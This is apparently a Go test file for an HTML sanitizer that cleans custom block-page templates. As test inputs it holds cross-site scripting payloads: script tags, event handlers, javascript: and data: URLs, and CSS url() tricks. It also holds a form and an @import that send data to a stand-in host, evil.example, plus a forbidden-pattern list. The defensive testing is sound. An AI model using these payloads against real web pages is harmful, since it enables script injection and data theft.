package config

import (
	"strings"
	"testing"
)

func TestSanitizeBlockPageHTMLRemovesActiveContentAndKeepsTemplates(t *testing.T) {
	dirty := `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><style>.ok { color: red; }</style><script>alert(1)</script></head><body onload="alert(2)"><main class="ok" style="color:red">Hello {{.TraceID}}<a href="javascript:alert(3)" onclick="alert(4)">link</a><img src="data:text/html;base64,PHNjcmlwdD4=" onerror="alert(5)"></main><form action="https://evil.example/steal"><input name="x"></form></body></html>`

	clean, err := SanitizeBlockPageHTML(dirty)
	if err != nil {
		t.Fatalf("sanitize: %v", err)
	}
	for _, forbidden := range []string{"<script", "onload=", "onclick=", "onerror=", "<form", "<input", "http-equiv=\"refresh\"", "javascript:", "data:text/html", "evil.example"} {
		if strings.Contains(strings.ToLower(clean), forbidden) {
			t.Errorf("sanitized HTML still contains %q: %s", forbidden, clean)
		}
	}
	for _, required := range []string{"Hello {{.TraceID}}", `class="ok"`, `style="color:red"`, `<style>`} {
		if !strings.Contains(clean, required) {
			t.Errorf("sanitized HTML lost safe content %q: %s", required, clean)
		}
	}
}

func TestSanitizeBlockPageHTMLRejectsDangerousCSS(t *testing.T) {
	clean, err := SanitizeBlockPageHTML(`<html><body><div style="background:url(javascript:alert(1));color:blue">text</div></body></html>`)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(clean), "javascript") || strings.Contains(strings.ToLower(clean), "style=\"") {
		t.Fatalf("dangerous CSS was retained: %s", clean)
	}
}

func TestSanitizeBlockPageHTMLRejectsDangerousStyleElementText(t *testing.T) {
	clean, err := SanitizeBlockPageHTML(`<html><head><style>@import url("https://evil.example/track.css"); .safe { color: blue; }</style></head><body>text</body></html>`)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(clean), "@import") || strings.Contains(strings.ToLower(clean), "evil.example") {
		t.Fatalf("dangerous style element content was retained: %s", clean)
	}
	if !strings.Contains(clean, "color: blue") {
		t.Fatalf("safe style element content was removed: %s", clean)
	}
}
